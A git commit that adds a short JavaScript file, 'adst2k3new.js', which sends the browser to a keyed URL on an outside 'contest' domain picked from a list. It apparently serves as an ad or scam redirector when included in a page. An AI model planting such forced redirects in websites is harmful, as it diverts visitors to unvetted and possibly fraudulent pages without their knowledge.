d27d124e8f292b2b3def05ddfaf8ea53a320d61d
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2024-08-31 15:52:09 +0700

    Create adst2k3new.js

---
+++ adst2k3new.js
@@ -0,0 +1,7 @@
+var dataUrl = [
+
+  'https://contestjoe.com/x9wigvew?key=578a093a19f2f6271ad8cd37f2112877'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
